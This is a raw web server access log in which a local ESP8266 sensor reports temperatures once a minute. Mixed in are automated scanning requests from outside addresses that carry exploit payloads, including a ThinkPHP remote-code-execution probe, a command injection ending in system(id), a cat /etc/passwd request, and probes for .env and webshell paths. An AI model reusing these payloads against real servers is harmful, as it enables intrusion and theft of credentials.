192.168.1.30 - - [31/Oct/2022:00:13:05 +0600] "GET /tmons/monitor2.php?temperature=20.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:13:23 +0600] "GET /tmons/monitor.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:14:05 +0600] "GET /tmons/monitor2.php?temperature=20.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:14:23 +0600] "GET /tmons/monitor.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:15:06 +0600] "GET /tmons/monitor2.php?temperature=20.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:15:24 +0600] "GET /tmons/monitor.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:16:06 +0600] "GET /tmons/monitor2.php?temperature=20.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:16:24 +0600] "GET /tmons/monitor.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:17:06 +0600] "GET /tmons/monitor2.php?temperature=20.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:17:24 +0600] "GET /tmons/monitor.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:18:06 +0600] "GET /tmons/monitor2.php?temperature=20.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:18:24 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:19:06 +0600] "GET /tmons/monitor2.php?temperature=20.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:19:25 +0600] "GET /tmons/monitor.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:20:07 +0600] "GET /tmons/monitor2.php?temperature=20.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:20:25 +0600] "GET /tmons/monitor.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:21:07 +0600] "GET /tmons/monitor2.php?temperature=20.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:21:25 +0600] "GET /tmons/monitor.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:22:07 +0600] "GET /tmons/monitor2.php?temperature=20.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:22:25 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:23:07 +0600] "GET /tmons/monitor2.php?temperature=20.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:23:26 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:24:08 +0600] "GET /tmons/monitor2.php?temperature=20.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:24:26 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:25:08 +0600] "GET /tmons/monitor2.php?temperature=20.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [31/Oct/2022:00:25:23 +0600] "GET /tool/log/c.php?strip_slashes=md5&host=2GrPlH1glvRW7lbNgGCdpnzvkOx HTTP/1.1" 404 212 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
118.179.24.169 - - [31/Oct/2022:00:25:29 +0600] "POST / HTTP/1.1" 200 139 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:26:08 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:26:32 +0600] "GET /tmons/monitor.php?temperature=23.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [31/Oct/2022:00:26:43 +0600] "POST /user.action HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:27:08 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:27:32 +0600] "GET /tmons/monitor.php?temperature=23.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:28:08 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:28:32 +0600] "GET /tmons/monitor.php?temperature=23.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:29:09 +0600] "GET /tmons/monitor2.php?temperature=20.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:29:32 +0600] "GET /tmons/monitor.php?temperature=22.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:30:09 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:30:32 +0600] "GET /tmons/monitor.php?temperature=22.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [31/Oct/2022:00:30:35 +0600] "GET /solr/admin/cores?wt=json HTTP/1.1" 404 214 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36"
118.179.24.171 - - [31/Oct/2022:00:30:58 +0600] "POST /zdm/cxf/login HTTP/1.1" 404 211 "http://103.231.135.59/zdm/login_xdm_uc.jsp" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:31:09 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:31:33 +0600] "GET /tmons/monitor.php?temperature=22.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:32:09 +0600] "GET /tmons/monitor2.php?temperature=20.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:32:34 +0600] "GET /tmons/monitor.php?temperature=22.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.168 - - [31/Oct/2022:00:32:56 +0600] "GET /nuxeo/login.jsp/pwn$%7B31333333330+7%7D.xhtml HTTP/1.1" 404 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F"
192.168.1.30 - - [31/Oct/2022:00:33:10 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:33:34 +0600] "GET /tmons/monitor.php?temperature=22.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:34:10 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:34:34 +0600] "GET /tmons/monitor.php?temperature=22.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:35:10 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:35:34 +0600] "GET /tmons/monitor.php?temperature=22.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:36:10 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.168 - - [31/Oct/2022:00:36:30 +0600] "POST /index.php HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:36:35 +0600] "GET /tmons/monitor.php?temperature=22.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.170 - - [31/Oct/2022:00:36:57 +0600] "POST /cgi-bin/login.cgi HTTP/1.1" 404 215 "http://103.231.135.59" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36"
118.179.24.169 - - [31/Oct/2022:00:36:58 +0600] "POST /cgi-bin/system_log.cgi HTTP/1.1" 404 220 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:37:11 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:37:35 +0600] "GET /tmons/monitor.php?temperature=22.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:38:11 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:38:35 +0600] "GET /tmons/monitor.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:39:11 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:39:36 +0600] "GET /tmons/monitor.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:40:11 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:40:36 +0600] "GET /tmons/monitor.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:41:11 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:41:36 +0600] "GET /tmons/monitor.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.168 - - [31/Oct/2022:00:42:11 +0600] "POST /invoker/JMXInvokerServlet/ HTTP/1.1" 404 224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:42:12 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [31/Oct/2022:00:42:21 +0600] "POST /invoker/EJBInvokerServlet/ HTTP/1.1" 404 224 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:42:36 +0600] "GET /tmons/monitor.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:43:12 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.168 - - [31/Oct/2022:00:43:16 +0600] "GET /index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(id) HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:43:37 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:44:12 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:44:37 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:45:12 +0600] "GET /tmons/monitor2.php?temperature=20.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:45:37 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:46:13 +0600] "GET /tmons/monitor2.php?temperature=20.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:46:38 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:47:13 +0600] "GET /tmons/monitor2.php?temperature=20.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:47:41 +0600] "GET /tmons/monitor.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:48:13 +0600] "GET /tmons/monitor2.php?temperature=20.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:48:41 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:49:13 +0600] "GET /tmons/monitor2.php?temperature=19.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:49:41 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:50:13 +0600] "GET /tmons/monitor2.php?temperature=19.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [31/Oct/2022:00:50:26 +0600] "POST /guest_auth/guestIsUp.php HTTP/1.1" 404 222 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36"
118.179.24.169 - - [31/Oct/2022:00:50:29 +0600] "GET /guest_auth/poc.php?cmd=cat%20/etc/passwd HTTP/1.1" 404 216 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:50:41 +0600] "GET /tmons/monitor.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:51:14 +0600] "GET /tmons/monitor2.php?temperature=19.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:51:42 +0600] "GET /tmons/monitor.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:52:14 +0600] "GET /tmons/monitor2.php?temperature=20.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:52:42 +0600] "GET /tmons/monitor.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:53:14 +0600] "GET /tmons/monitor2.php?temperature=21.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:53:42 +0600] "GET /tmons/monitor.php?temperature=22.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:54:14 +0600] "GET /tmons/monitor2.php?temperature=21.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [31/Oct/2022:00:54:25 +0600] "POST /v1/backend1 HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:54:42 +0600] "GET /tmons/monitor.php?temperature=23.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.168 - - [31/Oct/2022:00:54:54 +0600] "GET /manage/webshell/u?s=5&w=218&h=15&k=%0a&l=62&_=5621298674064 HTTP/1.1" 404 215 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:55:15 +0600] "GET /tmons/monitor2.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:55:43 +0600] "GET /tmons/monitor.php?temperature=23.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:56:15 +0600] "GET /tmons/monitor2.php?temperature=22.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:56:43 +0600] "GET /tmons/monitor.php?temperature=23.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:57:15 +0600] "GET /tmons/monitor2.php?temperature=22.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:57:43 +0600] "GET /tmons/monitor.php?temperature=23.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:58:15 +0600] "GET /tmons/monitor2.php?temperature=22.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:58:44 +0600] "GET /tmons/monitor.php?temperature=22.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
20.175.60.8 - - [31/Oct/2022:00:58:57 +0600] "GET /.env HTTP/1.1" 404 202 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.175.60.8 - - [31/Oct/2022:00:58:57 +0600] "POST / HTTP/1.1" 200 139 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:00:59:16 +0600] "GET /tmons/monitor2.php?temperature=22.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:00:59:44 +0600] "GET /tmons/monitor.php?temperature=22.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:00:16 +0600] "GET /tmons/monitor2.php?temperature=22.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:00:44 +0600] "GET /tmons/monitor.php?temperature=22.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:01:16 +0600] "GET /tmons/monitor2.php?temperature=22.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:01:45 +0600] "GET /tmons/monitor.php?temperature=22.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:02:16 +0600] "GET /tmons/monitor2.php?temperature=22.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:02:45 +0600] "GET /tmons/monitor.php?temperature=22.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:03:16 +0600] "GET /tmons/monitor2.php?temperature=22.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:03:46 +0600] "GET /tmons/monitor.php?temperature=22.20&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:04:17 +0600] "GET /tmons/monitor2.php?temperature=22.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:04:46 +0600] "GET /tmons/monitor.php?temperature=22.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:05:17 +0600] "GET /tmons/monitor2.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:05:46 +0600] "GET /tmons/monitor.php?temperature=22.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:06:17 +0600] "GET /tmons/monitor2.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:06:46 +0600] "GET /tmons/monitor.php?temperature=22.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:07:17 +0600] "GET /tmons/monitor2.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:07:47 +0600] "GET /tmons/monitor.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:08:18 +0600] "GET /tmons/monitor2.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:08:47 +0600] "GET /tmons/monitor.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:09:18 +0600] "GET /tmons/monitor2.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:09:47 +0600] "GET /tmons/monitor.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:10:18 +0600] "GET /tmons/monitor2.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:10:47 +0600] "GET /tmons/monitor.php?temperature=21.90&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:11:18 +0600] "GET /tmons/monitor2.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.169 - - [31/Oct/2022:01:11:39 +0600] "GET /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 200 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:01:11:48 +0600] "GET /tmons/monitor.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:12:18 +0600] "GET /tmons/monitor2.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:12:48 +0600] "GET /tmons/monitor.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:13:19 +0600] "GET /tmons/monitor2.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:13:48 +0600] "GET /tmons/monitor.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
118.179.24.171 - - [31/Oct/2022:01:13:50 +0600] "POST /mifs/.;/services/LogService HTTP/1.1" 404 225 "https://103.231.135.59" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
192.168.1.30 - - [31/Oct/2022:01:14:19 +0600] "GET /tmons/monitor2.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:14:48 +0600] "GET /tmons/monitor.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:15:19 +0600] "GET /tmons/monitor2.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:15:49 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:16:19 +0600] "GET /tmons/monitor2.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:16:49 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:17:20 +0600] "GET /tmons/monitor2.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:17:49 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:18:20 +0600] "GET /tmons/monitor2.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:18:49 +0600] "GET /tmons/monitor.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:19:20 +0600] "GET /tmons/monitor2.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:19:50 +0600] "GET /tmons/monitor.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:20:20 +0600] "GET /tmons/monitor2.php?temperature=21.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:20:50 +0600] "GET /tmons/monitor.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:21:21 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:21:50 +0600] "GET /tmons/monitor.php?temperature=21.80&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:22:21 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:22:50 +0600] "GET /tmons/monitor.php?temperature=22.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
